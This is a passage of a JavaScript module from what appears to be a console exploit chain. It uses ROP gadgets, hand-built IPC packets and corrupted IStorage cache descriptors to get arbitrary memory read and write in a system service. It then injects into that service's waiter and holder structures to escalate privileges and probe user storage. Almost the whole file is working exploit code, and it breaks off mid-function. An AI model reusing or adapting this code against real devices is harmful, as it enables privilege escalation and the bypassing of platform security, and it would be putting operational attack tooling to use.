import coreRuntime from "./runtime.mjs";

const {AnalysisBytes: AnalysisBytes, CachePlan: CachePlan, GADGET_MEMSET: GADGET_MEMSET, RootLayout: RootLayout, allocPage: allocPage, beginAllocationTracking: beginAllocationTracking, borrowThreadScheduling: borrowThreadScheduling, buildRawFrame: buildRawFrame, call_rop: call_rop, cloneObject: cloneObject, closeHandle: closeHandle, closeRawThread: closeRawThread, cmifReply: cmifReply, endAllocationTracking: endAllocationTracking, freeTrackedAllocations: freeTrackedAllocations, hex32: hex32, IPC_SEND_DISPATCHER: IPC_SEND_DISPATCHER, ipcListDirectory: ipcListDirectory, ipcStorageRead: ipcStorageRead, ipcStorageWrite: ipcStorageWrite, launchRawWorker: launchRawWorker, log: log, prepPacket: prepPacket, read8: read8, readFrameResult: readFrameResult, readDomainObjects: readDomainObjects, sendIPC: sendIPC, sendDomainCmd: sendDomainCmd, write32: write32, write8: write8, write64: write64, waitRawThread: waitRawThread} = coreRuntime;

export async function runPromotionStep(input) {
    const {config: config, addressPlan: addressPlan, addressReadVerified: addressReadVerified, candidateHandle: candidateHandle, domainSession: domainSession, helpers: helpers, rootStageVerified: rootStageVerified, verifiedIdentityTargets: verifiedIdentityTargets} = input;
    let addressCopy = input.addressCopy;
    let promotionAttempted = false;
    let promotionOutcome = null;
    let promotionRestored = true;
    let workerStateSafe = input.workerStateSafe;
    if (addressReadVerified && rootStageVerified && verifiedIdentityTargets && domainSession && candidateHandle && addressPlan) {
        promotionAttempted = true;
        promotionOutcome = await runPromotionAndUserStorageProbe({
            config: config,
            addressPlan: addressPlan,
            addressCopy: addressCopy,
            domainSession: domainSession,
            candidateHandle: candidateHandle,
            helpers: helpers,
            verifiedIdentityTargets: verifiedIdentityTargets,
            savedHandle: input.savedHandle,
            onElevated: input.onElevated,
            readFsAddressBytes: helpers.readFsAddressBytes
        });
        addressCopy = promotionOutcome.addressCopy || addressCopy;
        if (addressCopy && addressCopy.workerStateSafe === false) workerStateSafe = false;
        promotionRestored = !!promotionOutcome.restored;
        if (!promotionRestored && !promotionOutcome?.promotionRetained && !promotionOutcome?.promoted) {
            workerStateSafe = false;
            await log("PROMOTION: restoration could not be proven; skipping cache, " + "save, and handle cleanup for restart recovery");
        }
    } else {
        await log("PROMOTION: skipped; fresh identity proof, address read, or " + "retained domain session is unavailable");
    }
    return {
        promotionAttempted: promotionAttempted,
        promotionOutcome: promotionOutcome,
        promotionRestored: promotionRestored,
        promotionRetained: !!promotionOutcome?.promotionRetained,
        addressCopy: addressCopy,
        workerStateSafe: workerStateSafe,
        downstreamCompleted: !!promotionOutcome?.downstreamCompleted,
        retireRetainedEndpoint: promotionOutcome && promotionOutcome.retireRetainedEndpoint
    };
}

export async function runPromotionAndUserStorageProbe(input) {
    const {config: config, addressPlan: addressPlan, domainSession: domainSession, candidateHandle: candidateHandle, helpers: helpers, verifiedIdentityTargets: verifiedIdentityTargets, readFsAddressBytes: readFsAddressBytes} = input;
    const CONTROL_SIZE = config.CONTROL_SIZE;
    let addressCopy = input.addressCopy;
    let activePlan = addressPlan;
    let retainedEndpoint = null;
    let retainedSetupStarted = false;
    let retainedEndpointReady = false;
    var outcome = {
        promoted: false,
        openedUserFs: false,
        listedUserRoot: false,
        restored: false,
        listCount: 0,
        downstreamStarted: false,
        downstreamCompleted: false,
        promotionRetained: false,
        contentFsHandleClosed: true,
        contentFsDomainObjectClosed: true
    };
    var fields = verifiedIdentityTargets.fields;
    var readBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 8192);
    var writeBuf = allocPage(4096);
    var contentFsHandle = 0;
    var contentFsObjectIds = [];
    var downstreamSafeToRestore = true;
    var promotedSessionRetained = false;
    async function readObject(field, stage, plan) {
        if (retainedEndpointReady) return retainedReadMemory(field.object, field.objectSize, stage);
        var readPlan = plan || activePlan;
        if (!readPlan || readPlan !== activePlan) throw new Error(stage + " " + field.name + " read refused: requested cache plan is not installed");
        var reply = await readFsAddressBytes({
            config: config,
            addressPlan: readPlan,
            candidateHandle: candidateHandle,
            address: field.object,
            length: field.objectSize,
            outputBuf: readBuf
        });
        if (!reply.ok) throw new Error(stage + " " + field.name + " read failed: " + reply.error);
        return reply.bytes;
    }
    function calculateWriteOffset(address, writePlan, stageName) {
        if (!writePlan || !writePlan.lowerWindow) throw new Error(stageName + " has no qualified address plan");
        var start = writePlan.lowerWindow.proposedStart;
        var end = writePlan.target + CONTROL_SIZE;
        if (!Number.isSafeInteger(address) || address < start || address + 8 > end) throw new Error(stageName + " is outside the qualified address window");
        var offset = BigInt(address) - BigInt(writePlan.addressBias);
        if (offset < 0n || offset + 8n > BigInt(writePlan.storageSize) || BigInt(writePlan.addressBias) + offset !== BigInt(address)) throw new Error(stageName + " write offset is outside IStorage");
        var cycle = BigInt(writePlan.cycle || config.ROOT_CAPTURE_CHUNK);
        var alignedBlock = offset / BigInt(CONTROL_SIZE) * BigInt(CONTROL_SIZE);
        if (cycle <= 0n || alignedBlock % cycle !== 0n) throw new Error(stageName + " write offset is not in a " + "qualified cache bucket: offset=0x" + offset.toString(16) + " aligned=0x" + alignedBlock.toString(16) + " cycle=0x" + cycle.toString(16));
        return {
            address: address,
            offset: offset,
            alignedBlock: alignedBlock,
            cycle: cycle
        };
    }
    function writeOffsetForAddress(address, plan, stageName) {
        var writePlan = plan || activePlan;
        if (!writePlan || writePlan !== activePlan) throw new Error(stageName + " write refused: no matching installed address plan");
        return calculateWriteOffset(address, writePlan, stageName);
    }
    function buildTargetPlan(target, stageName) {
        var cycle = Number(addressPlan.cycle || config.ROOT_CAPTURE_CHUNK);
        var observedBlock = Math.floor(target / CONTROL_SIZE) * CONTROL_SIZE;
        var plan = CachePlan.buildLowerWindowPlan(target, addressPlan.storageSize, cycle, [ observedBlock ]);
        if (plan.addressBias + plan.readOffset !== target || Math.floor(plan.readOffset / CONTROL_SIZE) * CONTROL_SIZE % cycle !== 0) throw new Error(stageName + " target plan failed address or bucket checks");
        plan.lowerWindow.qualification = "retained-memory bootstrap target";
        var headerCheck = helpers.checkAddressHeaderEncoding(plan.bytes, {
            savedHandle: addressCopy.savedHandle
        });
        if (!headerCheck.ok) throw new Error(stageName + " target header encoding was rejected");
        calculateWriteOffset(target, plan, stageName);
        return plan;
    }
    async function installPlan(plan, stageName) {
        if (activePlan === plan) return;
        if (!addressCopy || addressCopy.workerStateSafe === false) throw new Error(stageName + " refused: address-copy worker state is unsafe");
        await log("PROMOTION: installing " + stageName + " target=0x" + plan.target.toString(16) + " readOffset=0x" + plan.readOffset.toString(16) + " cycle=0x" + Number(plan.cycle || config.ROOT_CAPTURE_CHUNK).toString(16));
        activePlan = null;
        var installed = await helpers.installAddressHeader({
            ...addressCopy,
            desiredBytes: plan.bytes,
            stageName: stageName
        });
        addressCopy = installed.addressCopy || addressCopy;
        if (!installed.ok) throw new Error(stageName + " cache-header copy was not qualified");
        activePlan = plan;
    }
    async function readMappedMemory(address, length, stageName, plan) {
        var readPlan = plan || activePlan;
        if (!readPlan || readPlan !== activePlan) throw new Error(stageName + " read refused: no matching installed mapping");
        var reply = await helpers.readFsAddressBytes({
            config: config,
            addressPlan: readPlan,
            candidateHandle: candidateHandle,
            address: address,
            length: length,
            outputBuf: readBuf
        });
        if (!reply.ok) throw new Error(stageName + " read failed: " + reply.error);
        return reply.bytes;
    }
    function u64Bytes(value) {
        var bytes = new Array(8);
        AnalysisBytes.writeU64LE(bytes, 0, BigInt(value));
        return bytes;
    }
    function zeroBytes(length) {
        var bytes = new Array(length);
        for (var i = 0; i < length; i++) bytes[i] = 0;
        return bytes;
    }
    function cacheEntry(offset, address) {
        var bytes = zeroBytes(48);
        AnalysisBytes.writeU64LE(bytes, 0, BigInt(offset));
        AnalysisBytes.writeU64LE(bytes, 8, 0x4000n);
        bytes[16] = 1;
        bytes[17] = 1;
        bytes[18] = 1;
        AnalysisBytes.writeU64LE(bytes, 32, BigInt(address));
        AnalysisBytes.writeU64LE(bytes, 40, 0x4000n);
        return bytes;
    }
    function hasOnlySafeCacheTail(bytes) {
        var tail = bytes.slice(48);
        if (tail.length !== 1392) return false;
        var any = false;
        for (var i = 0; i < tail.length; i++) any = any || !!tail[i];
        if (!any) return true;
        var start;
        var exactEightBytePath = false;
        if (tail[0] === 65) start = 0; else if (tail[0] === 0 && tail[1] === 65) start = 1; else if (AnalysisBytes.toHex(tail, 0, 8) === "0000400100000000") {
            start = 8;
            exactEightBytePath = true;
        } else if (AnalysisBytes.toHex(tail, 0, 5) === "0000400100") start = tail[5] === 0 ? 6 : 5; else return false;
        var end = -1;
        for (var ti = start; ti < tail.length; ti++) {
            if (tail[ti] === 0) {
                end = ti - start;
                break;
            }
        }
        if (end <= 0 || exactEightBytePath && end !== 552) return false;
        var slash = false;
        for (var pi = 0; pi < end; pi++) {
            var value = tail[start + pi];
            if (value !== 65 && value !== 47) return false;
            if (value === 47) slash = true;
        }
        if (!slash) return false;
        for (var zi = start + end; zi < tail.length; zi++) if (tail[zi] !== 0) return false;
        return true;
    }
    async function logicalRead(offset, length, stageName) {
        if (!Number.isSafeInteger(offset) || offset < 0 || length <= 0 || length > 16384 || offset + length > addressPlan.storageSize) throw new Error(stageName + " logical read is outside IStorage");
        call_rop(GADGET_MEMSET, readBuf, 0xA5n, BigInt(length));
        var reply = ipcStorageRead(candidateHandle, offset, length, readBuf);
        if (reply.error !== 0 || reply.transport !== 0) throw new Error(stageName + " IStorage::Read transport=" + hex32(reply.transport || 0) + " result=" + hex32(reply.error));
        var bytes = new Array(length);
        for (var i = 0; i < length; i++) bytes[i] = Number(read8(readBuf + BigInt(i)));
        return bytes;
    }
    async function logicalWrite(offset, bytes, stageName) {
        if (!Number.isSafeInteger(offset) || offset < 0 || !bytes || bytes.length <= 0 || bytes.length > 16384 || offset + bytes.length > addressPlan.storageSize) throw new Error(stageName + " logical write is outside IStorage");
        var allZero = true;
        for (var i = 0; i < bytes.length; i++) allZero = allZero && bytes[i] === 0;
        if (allZero) call_rop(GADGET_MEMSET, writeBuf, 0n, BigInt(bytes.length)); else for (var i = 0; i < bytes.length; i++) write8(writeBuf + BigInt(i), BigInt(bytes[i]));
        var reply = ipcStorageWrite(candidateHandle, BigInt(offset), writeBuf, bytes.length);
        if (reply.transport !== 0 || reply.error !== 0) throw new Error(stageName + " IStorage::Write transport=" + hex32(reply.transport || 0) + " result=" + hex32(reply.error));
    }
    async function bootstrapWrite(address, bytes, plan, stageName) {
        var writePlan = plan || activePlan;
        var offset = BigInt(address) - BigInt(writePlan.addressBias);
        var within = offset % BigInt(CONTROL_SIZE);
        if (writePlan !== activePlan || offset < 0n || within + BigInt(bytes.length) > BigInt(CONTROL_SIZE) || offset + BigInt(bytes.length) > BigInt(writePlan.storageSize) || address < writePlan.lowerWindow.proposedStart || address + bytes.length > writePlan.target + CONTROL_SIZE) throw new Error(stageName + " is outside the retained bootstrap block");
        var writeAt = writeOffsetForAddress(address, writePlan, stageName);
        await logicalWrite(Number(writeAt.offset), bytes, stageName);
        var observed = await readMappedMemory(address, bytes.length, stageName + " readback", writePlan);
        if (!AnalysisBytes.equal(observed, bytes)) throw new Error(stageName + " readback differs");
    }
    async function controlRead(offset, length) {
        if (!retainedEndpoint || offset < 0 || offset + length > retainedEndpoint.arrayLength) throw new Error("retained control read is outside its owned cache array");
        return logicalRead(offset, length, "retained control read");
    }
    async function controlWrite(offset, bytes) {
        if (!retainedEndpoint || offset < 0 || offset + bytes.length > retainedEndpoint.arrayLength) throw new Error("retained control write is outside its owned cache array");
        await logicalWrite(offset, bytes, "retained control write");
    }
    async function setRetainedPointer(address) {
        var state = retainedEndpoint;
        if (!state || !state.canonical || !Number.isSafeInteger(address) || address < 4294967296 || address >= 549755813888) throw new Error("invalid retained pointer target");
        var entry = await controlRead(state.dataEntryOffset, 48);
        if (AnalysisBytes.readU64LE(entry, 0) !== BigInt(state.dataOffset) || AnalysisBytes.readU64LE(entry, 8) !== 0x4000n || entry[16] !== 1 || entry[17] !== 1 || entry[18] !== 1 || AnalysisBytes.readU64LE(entry, 32) !== BigInt(state.pointer)) throw new Error("retained data descriptor changed");
        if (address !== state.pointer) {
            await controlWrite(state.dataEntryOffset + 32, u64Bytes(BigInt(address)));
            var observed = await controlRead(state.dataEntryOffset + 32, 8);
            if (!AnalysisBytes.equal(observed, u64Bytes(BigInt(address)))) throw new Error("retained pointer readback differs");
            state.pointer = address;
        }
    }
    async function retainedReadMemory(address, length, stageName) {
        var state = retainedEndpoint;
        if (globalThis.civFsPendingProbe || !state || !state.canonical || !Number.isSafeInteger(address) || address < 4294967296 || address + length >= 549755813888 || !Number.isInteger(length) || length <= 0 || length > 6291456) throw new Error(stageName + " invalid retained-memory range");
        var parts = [];
        for (var at = 0; at < length; at += 16384) {
            await setRetainedPointer(address + at);
            parts.push(await logicalRead(state.dataOffset, Math.min(16384, length - at), stageName));
        }
        var result = [];
        for (var pi = 0; pi < parts.length; pi++) for (var bi = 0; bi < parts[pi].length; bi++) result.push(parts[pi][bi]);
        return result;
    }
    async function probeBoundedNativeRead(address, length, alreadySelected, controlDescriptor = false) {
        if (!outcome.promoted || !retainedEndpointReady || globalThis.civFsPendingProbe || !Number.isSafeInteger(address) || !Number.isInteger(length) || length < 1 || length > 256) throw new Error("bounded FS probe prerequisites unavailable");
        if (controlDescriptor) {
            if (address !== retainedEndpoint.dataEntryOffset + 32 || length !== 8 || !alreadySelected) throw new Error("bounded FS control read shape differs");
        } else if (address < 4294967296 || address + length >= 549755813888) {
            throw new Error("bounded FS probe address unavailable");
        } else if (alreadySelected) {
            if (address < retainedEndpoint.pointer || address + length > retainedEndpoint.pointer + 16384) throw new Error("bounded FS probe pointer was not preselected");
        } else {
            await setRetainedPointer(address);
        }
        const readOffset = controlDescriptor ? address : retainedEndpoint.dataOffset + (address - retainedEndpoint.pointer);
        if (readOffset + length > addressPlan.storageSize) throw new Error("bounded FS probe exceeds candidate storage");
        const schedule = borrowThreadScheduling();
        if (!schedule || schedule.priority <= 0 || schedule.priority >= 64 || schedule.core > 7) throw new Error("bounded FS probe thread schedule unavailable");
        const allocations = beginAllocationTracking();
        if (!allocations) throw new Error("bounded FS probe tracker busy");
        let worker = null, exited = false;
        try {
            const packet = allocPage(8192);
            const output = allocPage(256);
            call_rop(GADGET_MEMSET, output, 0xa5n, 0x100n);
            prepPacket(packet, (4 | 1 << 24) >>> 0, 12, []);
            write32(packet + 8n, BigInt(length));
            write32(packet + 12n, BigInt(Number(output & 0xffffffffn)));
            write32(packet + 16n, BigInt((1 | Number(output >> 36n & 7n) << 2 | Number(output >> 32n & 15n) << 28) >>> 0));
            write32(packet + 0x20n, 0x49434653n);
            write32(packet + 0x28n, 0n);
            write64(packet + 0x30n, BigInt(readOffset));
            write64(packet + 0x38n, BigInt(length));
            const frame = buildRawFrame([ {
                fn: IPC_SEND_DISPATCHER,
                args: [ BigInt(candidateHandle), packet, 0x1000n, 0n ]
            } ]);
            worker = launchRawWorker(frame.frame, schedule);
            if (!worker?.handle || worker.rc !== 0 || !worker.started) throw new Error("bounded FS probe thread did not start");
            const wait = waitRawThread(worker.handle, 2000000000n);
            if (wait !== 0) {
                globalThis.civFsPendingProbe = Object.freeze({
                    worker: worker,
                    frame: frame,
                    packet: packet,
                    output: output,
                    allocations: allocations,
                    length: length,
                    wait: wait
                });
                return {
                    completed: false,
                    wait: wait
                };
            }
            exited = true;
            const transport = Number(readFrameResult(frame.frame, 0)) >>> 0;
            const result = transport === 0 ? cmifReply(packet).result : null;
            const bytes = [];
            if (transport === 0 && result === 0) for (let i = 0; i < length; i++) bytes.push(Number(read8(output + BigInt(i))));
            return {
                completed: true,
                transport: transport,
                result: result,
                bytes: bytes
            };
        } finally {
            if (exited && worker?.handle) closeRawThread(worker.handle);
            if (endAllocationTracking(allocations) && (exited || !worker?.started)) freeTrackedAllocations(allocations);
        }
    }
    function retireBoundedNativeRead() {
        const pending = globalThis.civFsPendingProbe;
        if (!pending) return {
            pending: false
        };
        const wait = waitRawThread(pending.worker.handle, 100000000n);
        if (wait !== 0) return {
            pending: true,
            wait: wait
        };
        const transport = Number(readFrameResult(pending.frame.frame, 0)) >>> 0;
        const result = transport === 0 ? cmifReply(pending.packet).result : null;
        const bytes = [];
        if (transport === 0 && result === 0) for (let i = 0; i < pending.length; i++) bytes.push(Number(read8(pending.output + BigInt(i))));
        closeRawThread(pending.worker.handle);
        freeTrackedAllocations(pending.allocations);
        delete globalThis.civFsPendingProbe;
        return {
            pending: false,
            completed: true,
            transport: transport,
            result: result,
            bytes: bytes
        };
    }
    function probeBoundedNativeWrite(address, bytes, cancelHandles, controlDescriptor = false) {
        if (!outcome.promoted || !retainedEndpointReady || globalThis.civFsPendingProbe || !Number.isSafeInteger(address) || !Array.isArray(bytes) || bytes.length < 1 || bytes.length > 256 || !Array.isArray(cancelHandles) || cancelHandles.length > 7) throw new Error("bounded FS write prerequisites unavailable");
        if (controlDescriptor) {
            if (address !== retainedEndpoint.dataEntryOffset + 32 || bytes.length !== 8 || cancelHandles.length !== 0) throw new Error("bounded FS control write shape differs");
        } else if (address < retainedEndpoint.pointer || address + bytes.length > retainedEndpoint.pointer + 16384) {
            throw new Error("bounded FS write pointer was not preselected");
        }
        const writeOffset = controlDescriptor ? address : retainedEndpoint.dataOffset + (address - retainedEndpoint.pointer);
        if (writeOffset + bytes.length > addressPlan.storageSize) throw new Error("bounded FS write exceeds candidate storage");
        const schedule = borrowThreadScheduling();
        if (!schedule || schedule.priority <= 0 || schedule.priority >= 64 || schedule.core > 7) throw new Error("bounded FS write thread schedule unavailable");
        const allocations = beginAllocationTracking();
        if (!allocations) throw new Error("bounded FS write tracker busy");
        let worker = null, exited = false;
        try {
            const packet = allocPage(8192);
            const input = allocPage(256);
            for (let i = 0; i < bytes.length; i++) write8(input + BigInt(i), BigInt(bytes[i]));
            prepPacket(packet, (4 | 1 << 20) >>> 0, 12, []);
            const inputAddress = BigInt(input);
            const size = BigInt(bytes.length);
            const flags = 1n | inputAddress >> 36n << 2n | size >> 32n << 24n | (inputAddress >> 32n & 0xfn) << 28n;
            write32(packet + 8n, size & 0xffffffffn);
            write32(packet + 12n, inputAddress & 0xffffffffn);
            write32(packet + 16n, flags & 0xffffffffn);
            write32(packet + 0x20n, 0x49434653n);
            write32(packet + 0x28n, 1n);
            write64(packet + 0x30n, BigInt(writeOffset));
            write64(packet + 0x38n, size);
            const calls = [ {
                fn: IPC_SEND_DISPATCHER,
                args: [ BigInt(candidateHandle), packet, 0x1000n, 0n ]
            } ];
            for (const handle of cancelHandles) calls.push({
                fn: coreRuntime.sdk_base + 0x168c0cn,
                args: [ BigInt(handle), 0n, 0n, 0n ]
            });
            const frame = buildRawFrame(calls);
            worker = launchRawWorker(frame.frame, schedule);
            if (!worker?.handle || worker.rc !== 0 || !worker.started) throw new Error("bounded FS write thread did not start");
            const wait = waitRawThread(worker.handle, 2000000000n);
            if (wait !== 0) {
                globalThis.civFsPendingProbe = Object.freeze({
                    worker: worker,
                    frame: frame,
                    packet: packet,
                    output: 0n,
                    allocations: allocations,
                    length: 0,
                    wait: wait
                });
                return {
                    completed: false,
                    wait: wait
                };
            }
            exited = true;
            const transport = Number(readFrameResult(frame.frame, 0)) >>> 0;
            const result = transport === 0 ? cmifReply(packet).result : null;
            const cancellations = [];
            for (let i = 1; i < calls.length; i++) cancellations.push(Number(readFrameResult(frame.frame, i)) >>> 0);
            return {
                completed: true,
                transport: transport,
                result: result,
                cancellations: cancellations
            };
        } finally {
            if (exited && worker?.handle) closeRawThread(worker.handle);
            if (endAllocationTracking(allocations) && (exited || !worker?.started)) freeTrackedAllocations(allocations);
        }
    }
    async function selectRetainedPointerBounded(address) {
        const state = retainedEndpoint;
        if (!outcome.promoted || !retainedEndpointReady || globalThis.civFsPendingProbe || !state?.canonical || !Number.isSafeInteger(address) || address < 4294967296 || address >= 549755813888) throw new Error("bounded FS pointer target unavailable");
        if (address === state.pointer) return {
            completed: true,
            verified: true
        };
        const bytes = u64Bytes(BigInt(address));
        const offset = state.dataEntryOffset + 32;
        const write = probeBoundedNativeWrite(offset, bytes, [], true);
        if (!write.completed || write.transport !== 0 || write.result !== 0) return {
            completed: false,
            stage: "write",
            write: write
        };
        const read = await probeBoundedNativeRead(offset, 8, true, true);
        if (!read.completed || read.transport !== 0 || read.result !== 0 || !AnalysisBytes.equal(read.bytes, bytes)) return {
            completed: false,
            stage: "read",
            read: read
        };
        state.pointer = address;
        return {
            completed: true,
            verified: true
        };
    }
    async function retainedWriteMemory(address, bytes, stageName) {
        var state = retainedEndpoint;
        if (globalThis.civFsPendingProbe || !state || !state.canonical || !Number.isSafeInteger(address) || !bytes || bytes.length <= 0 || bytes.length > 6291456 || address < 4294967296 || address + bytes.length >= 549755813888) throw new Error(stageName + " invalid retained-memory write range");
        for (var at = 0; at < bytes.length; at += 16384) {
            var part = bytes.slice(at, at + 16384);
            await setRetainedPointer(address + at);
            await logicalWrite(state.dataOffset, part, stageName);
            var observed = await logicalRead(state.dataOffset, part.length, stageName + " readback");
            if (!AnalysisBytes.equal(observed, part)) throw new Error(stageName + " retained write readback differs");
        }
    }
    async function retainedWriteMemoryUnverified(address, bytes, stageName) {
        var state = retainedEndpoint;
        if (!state || !state.canonical || !Number.isSafeInteger(address) || !bytes || bytes.length <= 0 || bytes.length > 256 || address < 4294967296 || address + bytes.length >= 549755813888) throw new Error(stageName + " invalid unverified retained-memory write");
        await setRetainedPointer(address);
        await logicalWrite(state.dataOffset, bytes, stageName);
    }
    async function compareWriteFsMemory(address, expectedBefore, expectedAfter, stageName) {
        if (!outcome.promoted || !retainedEndpointReady) throw new Error(stageName + " requires the verified elevated endpoint");
        if (!Number.isSafeInteger(address) || !Array.isArray(expectedBefore) || !Array.isArray(expectedAfter) || expectedBefore.length === 0 || expectedBefore.length !== expectedAfter.length || expectedBefore.length > 256) throw new Error(stageName + " requires equal, bounded byte snapshots");
        var before = await retainedReadMemory(address, expectedBefore.length, stageName + " precondition");
        if (!AnalysisBytes.equal(before, expectedBefore)) throw new Error(stageName + " precondition differs; no write issued");
        await retainedWriteMemory(address, expectedAfter, stageName);
        var after = await retainedReadMemory(address, expectedAfter.length, stageName + " readback");
        if (!AnalysisBytes.equal(after, expectedAfter)) throw new Error(stageName + " exact readback differs");
        return {
            address: address,
            length: expectedAfter.length,
            verified: true
        };
    }
    async function injectRoHolder(request) {
        await log("RO inject 1: validating request and waiters");
        if (!outcome.promoted || !retainedEndpointReady || !retainedEndpoint?.ready) throw new Error("RO gate requires the verified FS endpoint");
        const {server: server, parent: parent, vptr: vptr, park: park, receive: receive, buffer: buffer, domain: domain, metadata: metadata, workers: workers} = request || {};
        const canonical = value => Number.isSafeInteger(value) && value >= 4294967296 && value < 549755813888;
        if (![ server, parent, vptr, buffer, domain, metadata ].every(canonical) || !Number.isInteger(park) || !Number.isInteger(receive) || !Array.isArray(workers) || workers.length !== 7 || new Set(workers).size !== 7 || !workers.every(handle => Number.isInteger(handle) && handle >= 32768 && handle < 268435456)) throw new Error("RO gate input shape differs");
        const layout = verifiedIdentityTargets.domainLayout;
        const waiters = Array.from({
            length: 7
        }, (_, i) => layout.manager + 1040 + i * 272);
        if (vptr !== layout.rootVptr - 32120 || server < layout.manager + 3400 || server + 136 > layout.manager + 3400 + 65536 || (server - layout.manager - 3400) % 136 !== 0 || !waiters.includes(parent) || buffer < layout.captureStart || buffer + 256 > layout.captureEnd || !globalThis.civRoWorkers?.list || workers.some((handle, i) => handle !== globalThis.civRoWorkers.list[i]?.handle)) throw new Error("RO gate target is outside the verified layout");
        const waiter = await retainedReadMemory(parent + 16, 24, "RO gate waiter precondition");
        await log("RO inject 2: waiter read complete");
        const selected = Number(AnalysisBytes.readU64LE(waiter, 0));
        if (selected) return {
            injected: false,
            selected: selected
        };
        const holder = await retainedReadMemory(server, 136, "RO gate holder precondition");
        await log("RO inject 3: holder read complete");
        const u32 = (bytes, offset) => AnalysisBytes.readU32LE(bytes, offset);
        const u64 = (bytes, offset) => Number(AnalysisBytes.readU64LE(bytes, offset));
        if (u64(holder, 0) !== vptr || u32(holder, 48) !== park || u64(holder, 56) !== 1 || u32(holder, 72) !== receive || u64(holder, 96) !== buffer || u64(holder, 104) !== 256 || u64(holder, 112) !== domain || u64(holder, 120) !== metadata) throw new Error("RO gate holder identity changed");
        if (u64(holder, 40) !== parent || u32(holder, 64) !== 1) return {
            injected: false,
            retry: true,
            parent: u64(holder, 40),
            state: u32(holder, 64)
        };
        const header = await retainedReadMemory(buffer, 4, "RO gate request marker");
        await log("RO inject 4: request marker read complete");
        if (u32(header, 0) !== 4294967295) return {
            injected: false,
            acknowledged: true,
            header: u32(header, 0)
        };
        const cancelAddress = coreRuntime.sdk_base + 0x168c0cn;
        const cancelCode = [ 33, 3, 0, 212, 192, 3, 95, 214 ];
        for (let i = 0; i < cancelCode.length; i++) if (Number(read8(cancelAddress + BigInt(i))) !== cancelCode[i]) throw new Error("RO gate cancel wrapper differs");
        await log("RO inject 5: selecting waiter pointer");
        await setRetainedPointer(parent + 16);
        await log("RO inject 6: writing waiter selection");
        if (request.native === true) {
            const native = probeBoundedNativeWrite(parent + 16, u64Bytes(BigInt(server)), workers);
            if (!native.completed || native.transport !== 0 || native.result !== 0 || native.cancellations?.length !== 7 || native.cancellations.some(result => result !== 0)) return {
                injected: false,
                nativeFailure: true,
                completed: native.completed,
                transport: native.transport,
                result: native.result
            };
            await log("RO inject 7: native write and cancellations returned");
            return {
                injected: true,
                parent: parent,
                epoch: AnalysisBytes.readU64LE(waiter, 8).toString(),
                cancellations: native.cancellations
            };
        }
        await logicalWrite(retainedEndpoint.dataOffset, u64Bytes(BigInt(server)), "RO gate waiter selection");
        const cancellations = workers.map(handle => Number(call_rop(cancelAddress, BigInt(handle))) >>> 0);
        await log("RO inject 7: write and cancellations returned");
        if (!cancellations.every(result => result === 0)) throw new Error("RO gate worker cancellation failed");
        return {
            injected: true,
            parent: parent,
            epoch: AnalysisBytes.readU64LE(waiter, 8).toString(),
            cancellations: cancellations
        };
    }
    async function installRetainedEndpoint(layout) {
        if (!layout || !Number.isSafeInteger(layout.array) || !Number.isSafeInteger(layout.owner) || !Number.isSafeInteger(layout.captureStart) || !Number.isSafeInteger(layout.captureEnd) || !Array.isArray(layout.ownerBytes) || layout.ownerBytes.length !== 120) throw new Error("no unique qualified retained cache array/owner pair");
        var array = layout.array;
        var owner = layout.owner;
        if (array < 4294967296 || array >= 549755813888 || array % 8 !== 0 || owner < 4294967296 || owner >= 549755813888 || owner % 8 !== 0 || array < layout.captureStart || array + 1440 > layout.captureEnd || owner < layout.captureStart || owner + 120 > layout.captureEnd || AnalysisBytes.readU64LE(layout.ownerBytes, 32) !== BigInt(addressPlan.storageSize) || AnalysisBytes.readU64LE(layout.ownerBytes, 40) !== 0x4000n || AnalysisBytes.readU64LE(layout.ownerBytes, 72) !== BigInt(array) || AnalysisBytes.readU64LE(layout.ownerBytes, 80) !== 0x5A0n || AnalysisBytes.readU32LE(layout.ownerBytes, 88) !== 10 || AnalysisBytes.readU64LE(layout.ownerBytes, 96) !== 14n) throw new Error("retained owner snapshot failed structural checks");
        var arrayPlan = buildTargetPlan(array, "retained cache array");
        retainedSetupStarted = true;
        await installPlan(arrayPlan, "cache-retained-array");
        var before = await readMappedMemory(array, 1440, "retained cache array snapshot", arrayPlan);
        if (AnalysisBytes.readU64LE(before, 0) !== AnalysisBytes.readU64LE(arrayPlan.bytes, 0) || AnalysisBytes.readU64LE(before, 8) !== AnalysisBytes.readU64LE(arrayPlan.bytes, 8) || before[16] !== 0 || AnalysisBytes.readU64LE(before, 24) !== 0n || AnalysisBytes.readU64LE(before, 32) !== 0n || AnalysisBytes.readU64LE(before, 40) !== 0n || !hasOnlySafeCacheTail(before)) throw new Error("retained bootstrap does not expose its recognized owned cache array");
        var dataOffset = 16384;
        var dataEntryOffset = 144;
        var scratchOffset = 1440 - 24;
        var scratchAddress = array + scratchOffset;
        var originalScratch = before.slice(scratchOffset, scratchOffset + 16);
        if (before.slice(48).some(Boolean)) await bootstrapWrite(array + 48, zeroBytes(1440 - 48), arrayPlan, "retained clear unused cache entries");
        var marker = [ 82, 69, 84, 65, 73, 78, 69, 68, 0, 255, 17, 34, 170, 85, 153, 102 ];
        var secondMarker = [ 82, 69, 84, 65, 73, 78, 69, 68, 1, 238, 34, 51, 187, 102, 170, 119 ];
        await bootstrapWrite(scratchAddress, marker, arrayPlan, "retained scratch marker");
        var dataHeader = cacheEntry(dataOffset, scratchAddress);
        await bootstrapWrite(array + dataEntryOffset, dataHeader, arrayPlan, "retained data descriptor");
        if (!AnalysisBytes.equal(await logicalRead(dataOffset, 16, "retained data channel proof"), marker)) throw new Error("retained data descriptor did not read its scratch marker");
        await logicalWrite(dataOffset, secondMarker, "retained scratch data-channel write");
        if (!AnalysisBytes.equal(await readMappedMemory(scratchAddress, 16, "retained scratch cross-channel readback", arrayPlan), secondMarker)) throw new Error("retained data channel did not update the owned scratch marker");
        await logicalWrite(dataOffset, originalScratch, "retained scratch restoration");
        if (!AnalysisBytes.equal(await readMappedMemory(scratchAddress, 16, "retained scratch restoration readback", arrayPlan), originalScratch)) throw new Error("retained scratch bytes were not restored");
        await bootstrapWrite(array + dataEntryOffset + 32, u64Bytes(BigInt(array)), arrayPlan, "retained control descriptor retarget");
        var releasedControl = await logicalRead(dataOffset, 48, "retained control channel proof");
        if (AnalysisBytes.readU64LE(releasedControl, 0) !== AnalysisBytes.readU64LE(arrayPlan.bytes, 0) || AnalysisBytes.readU64LE(releasedControl, 8) !== AnalysisBytes.readU64LE(arrayPlan.bytes, 8)) throw new Error("retained data channel did not reach its control descriptor");
